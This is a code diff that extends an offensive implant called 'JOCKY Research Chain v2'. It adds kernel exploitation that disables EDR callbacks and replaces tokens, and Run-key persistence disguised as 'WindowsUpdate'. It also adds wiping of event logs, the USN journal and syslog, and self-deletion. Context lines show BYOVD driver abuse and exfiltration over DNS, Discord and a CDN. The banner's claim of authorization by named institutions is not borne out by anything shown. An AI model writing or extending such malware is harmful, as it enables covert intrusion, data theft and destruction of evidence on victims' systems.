@@ -162,6 +162,12 @@ fn select_and_activate_strategy() {
             btr_disable_notifications()
             btr_mask_module("ntdll.dll")
             btr_mask_module("kernel32.dll")
+
+            // Advanced kernel exploitation
+            println("  [+] Enabling kernel exploitation framework")
+            jocky_exploit_disable_callbacks()
+            jocky_exploit_token_replacement(0, 0)
+            log_operation("kernel_exploit", "callbacks_disabled", "edr_callbacks", "disabled")
         } else {
             println("  [+] Activating hybrid evasion")
             strategy_name = "kernel_hybrid"
@@ -365,6 +371,27 @@ fn exfiltrate_via_cdn() {
     }
 }
 
+fn setup_persistence_and_registry() {
+    println("[*] Setting up Windows persistence...")
+
+    // Create registry key for persistence
+    let registry_key = jocky_alloc(256)
+    let ok = jocky_registry_create_key(0x80000002, "Software\\Microsoft\\Windows\\Run", registry_key)
+
+    if ok {
+        println("  [+] Registry key created")
+        jocky_registry_set_value(registry_key, "WindowsUpdate", "C:\\ProgramData\\update.exe", 32, 1)
+        println("  [+] Persistence value set")
+        jocky_registry_close_key(registry_key)
+        log_operation("persistence", "registry_set", "Software\\\\Microsoft\\\\Windows\\\\Run", "success")
+    } else {
+        println("  [!] Registry setup failed")
+    }
+
+    jocky_free(registry_key)
+    println("")
+}
+
 fn perform_forensic_cleanup() {
     println("[*] Cleaning forensic artifacts...")
 
@@ -372,20 +399,31 @@ fn perform_forensic_cleanup() {
     println("  [*] Windows artifacts...")
     forensics_wipe_powershell_history()
     forensics_wipe_cmd_history()
-    forensics_clear_event_logs()
+    jocky_cleanup_event_logs("Application,Security,System")
     forensics_flush_arp_cache()
     forensics_clear_dns_cache()
-    forensics_clear_usn_journal()
+    jocky_cleanup_usn_journal()
     println("    [+] Windows cleanup complete")
 
     // Linux cleanup
     println("  [*] Linux artifacts...")
     linux_forensics_wipe_bash_history()
-    linux_forensics_clear_syslog()
-    linux_forensics_clear_journal()
+    jocky_linux_cleanup_syslog()
+    jocky_linux_cleanup_journal()
     println("    [+] Linux cleanup complete")
 
     log_operation("forensics", "cleanup_complete", "all_layers", "wiped")
+    println("")
+}
+
+fn perform_self_deletion() {
+    println("[*] Scheduling self-deletion...")
+
+    // Windows self-delete at exit
+    jocky_self_delete()
+
+    println("  [+] Self-deletion scheduled")
+    log_operation("forensics", "self_delete", "binary_path", "scheduled")
     println("")
 }
 
@@ -439,7 +477,7 @@ fn main() {
     println("")
     println("================================================================================")
     println("JOCKY Research Chain v2 - Complete Integration")
-    println("BYOVD Driver Chain + Threat Scoring + Multi-Channel Exfiltration")
+    println("BYOVD Driver Chain + Exploitation + Persistence + Multi-Channel Exfiltration")
     println("Authorized: Red Hat + IIT Bombay Cyber Security Team")
     println("================================================================================")
     println("")
@@ -468,17 +506,24 @@ fn main() {
     // Phase 8: Data Collection
     let chunk_count = collect_and_encrypt_data(data_sources)
 
-    // Phase 9: Exfiltration
+    // Phase 9: Windows Persistence Setup
+    println("[*] Windows persistence setup...")
+    setup_persistence_and_registry()
+
+    // Phase 10: Exfiltration
     println("[*] Multi-channel exfiltration...")
     exfiltrate_via_dns()
     exfiltrate_via_discord()
     exfiltrate_via_cdn()
     println("")
 
-    // Phase 10: Forensic Cleanup
+    // Phase 11: Forensic Cleanup
     perform_forensic_cleanup()
 
-    // Phase 11: Audit Export
+    // Phase 12: Self-Deletion
+    perform_self_deletion()
+
+    // Phase 13: Audit Export
     export_audit_trail()
 
     // Print Summary
